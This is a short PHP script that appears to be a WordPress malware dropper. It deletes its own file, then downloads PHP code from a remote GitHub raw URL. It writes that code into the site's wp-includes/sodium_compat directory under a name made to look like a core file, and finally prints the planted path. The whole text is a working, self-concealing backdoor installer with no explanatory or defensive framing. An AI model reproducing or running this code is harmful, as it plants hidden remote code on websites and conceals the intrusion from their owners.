<?php
        unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
        $c = file_get_contents('https://raw.githubusercontent.com/maddalenasa/supportaa/refs/heads/main/v2/aWhZo3DginiASZ.php');
        if (strpos($c, '<?php')===false)  die('err fgc');
        $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-includes/sodium_compat/src/Core32/align.php', $c);
        if ($r===false) die('err saving');
        die('/wp-includes/sodium_compat/src/Core32/align.php');